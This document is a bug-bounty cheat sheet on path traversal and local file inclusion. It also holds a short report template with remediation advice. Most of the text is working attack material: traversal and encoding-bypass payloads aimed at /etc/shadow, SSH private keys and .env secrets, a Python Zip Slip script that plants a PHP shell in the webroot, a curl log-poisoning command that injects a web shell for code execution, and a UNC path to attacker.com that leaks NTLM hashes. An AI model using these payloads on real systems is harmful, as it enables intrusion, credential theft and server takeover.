# Path Traversal / Directory Traversal (LFI)

> **OWASP:** A01:2021 — Broken Access Control  
> **Severity:** Medium → Critical (SSH keys / RCE = Critical)  
> **Bounty Range:** $300 – $30,000+ (LFI → RCE = max payout)

---

## What is Path Traversal?

Path traversal (aka Directory Traversal / LFI) lets attackers read files outside the web root by injecting `../` sequences into file parameters. The server resolves the path and returns files it was never meant to serve.

```
Web root: /var/www/html/
Request:  /download?file=../../../etc/passwd
Resolved: /var/www/html/../../../etc/passwd = /etc/passwd  ← reads system file!
```

---

## 6 Techniques

### 01 · Basic Path Traversal
```bash
# Linux targets
?file=../../../etc/passwd
?file=../../../etc/shadow
?file=../../../etc/hosts
?file=../../../proc/self/environ
?file=../../../var/log/apache2/access.log

# Windows targets
?file=..\..\..\Windows\win.ini
?file=..\..\..\Windows\System32\drivers\etc\hosts
?file=C:\boot.ini

# Count levels — usually 3-6 ../ to reach root
?file=../../etc/passwd       # 2 levels
?file=../../../etc/passwd    # 3 levels ← most common
?file=../../../../etc/passwd # 4 levels
```

### 02 · Encoded Bypass Techniques
```bash
# URL encoded
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoded (bypass WAF that decodes once)
?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode / UTF-8 overlong encoding
?file=..%c0%af..%c0%afetc%c0%afpasswd      # %c0%af = /
?file=..%ef%bc%8f..%ef%bc%8fetc/passwd     # fullwidth solidus

# Mixed encoding
?file=....//....//etc/passwd               # after stripping ../ leaves ../
?file=..%2f..%2fetc%2fpasswd              # partial encoding

# Null byte (old PHP < 5.3.4)
?file=../../../etc/passwd%00.jpg           # cuts off .jpg extension
```

### 03 · Null Byte Injection
```
If server appends extension: file + ".txt"
Inject %00 to terminate string:

?file=../../../etc/passwd%00
→ server reads: /etc/passwd\x00.txt
→ \x00 terminates the string → reads /etc/passwd!

Works on: old PHP, some C-based applications
```

### 04 · Zip Slip (Archive Upload)
```python
# Create malicious zip with directory traversal in filename
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.write('/tmp/shell.php', '../../../var/www/html/shell.php')

# When server extracts without sanitizing:
# → writes shell.php to webroot = RCE!

# Other targets:
# ../../../etc/cron.d/evil       = cron job = RCE
# ../../../home/user/.ssh/authorized_keys = SSH access
# ../../../etc/sudoers           = privilege escalation
```

### 05 · Log File Poisoning → LFI → RCE
```bash
# Step 1: Poison the log
curl -A '<?php system($_GET["cmd"]); ?>' https://target.com/

# Step 2: Include the log via LFI
GET /view?page=../../../var/log/apache2/access.log&cmd=id

# Common log locations:
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/mail.log
/proc/self/fd/2         # stderr — poisonable via error messages

# Other poisonable files:
/proc/self/environ      # poison via User-Agent, then LFI
/var/mail/www-data      # poison via email, then LFI
```

### 06 · Windows-Specific Traversal
```
Backslash separators:
?file=..\..\..\Windows\win.ini
?file=..\..\..\boot.ini

Drive letter absolute:
?file=C:\Windows\win.ini
?file=C:\inetpub\wwwroot\web.config

UNC path (NTLM hash leak!):
?file=\\attacker.com\share\test
→ Windows makes SMB request → leaks NTLM hash
→ Crack hash with hashcat or relay attack

IIS short names:
?file=../PROGRA~1/       # Program Files via 8.3 name
```

---

## Top Files to Target

| File | OS | What it reveals |
|------|-----|----------------|
| `/etc/passwd` | Linux | All users, home dirs, shells |
| `/etc/shadow` | Linux | Hashed passwords (crack offline) |
| `~/.ssh/id_rsa` | Linux | Private SSH key → server access |
| `/.env` | Both | DB passwords, API keys, secrets |
| `/proc/self/environ` | Linux | Process env vars, secrets |
| `/proc/self/cmdline` | Linux | How app was started |
| `/var/log/apache2/access.log` | Linux | Poisonable → RCE |
| `C:\Windows\win.ini` | Windows | Confirm traversal works |
| `C:\inetpub\wwwroot\web.config` | Windows | IIS config + creds |
| `/app/config/database.yml` | Linux | DB credentials |

---

## Checklist

```
☐  Test file=, path=, page=, doc=, template=, load= params with ../
☐  Try encoded variants: %2e%2e%2f  %252e%252e%252f  ..%2f
☐  Target: /etc/passwd  /etc/shadow  /proc/self/environ  /.env
☐  Test null byte: ../../../etc/passwd%00.jpg  (old PHP servers)
☐  Upload zip/tar — check for Zip Slip (use zipslip PoC tool)
☐  Windows targets: use \\ separators and try win.ini, SAM, hosts
☐  Try log poisoning: inject PHP into User-Agent then LFI the log
☐  Combine with SSRF: file:///etc/passwd via SSRF endpoint
```

---

## Report Template

```
Title: Path Traversal in /download — Arbitrary File Read

Severity: High (CVSS 7.5) / Critical if SSH keys or secrets found

Endpoint: GET /download?file=

Steps to Reproduce:
1. Send: GET /download?file=../../../etc/passwd
2. Response contains full contents of /etc/passwd:
   root:x:0:0:root:/root:/bin/bash
   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
   ...

Further exploitation:
- GET /download?file=../../../home/ubuntu/.ssh/id_rsa
  → Returns SSH private key → full server access

Impact:
Read any file on the server. SSH keys, .env files, config files,
and source code can lead to full server compromise.

Remediation:
- Validate and sanitize file paths server-side
- Use allowlist of permitted files/directories
- Resolve path to canonical form and verify it starts with allowed base path
- Never concatenate user input directly into file paths
```

---

## Tools

- **dotdotpwn** — `perl dotdotpwn.pl -m http -h target.com -f /etc/passwd`
- **Burp Suite** — Intruder with path traversal wordlist
- **LFISuite** — automated LFI exploitation
- **zipslip** — test zip file extraction for Zip Slip

---

*Daily Bug Bounty notes — follow for more.*
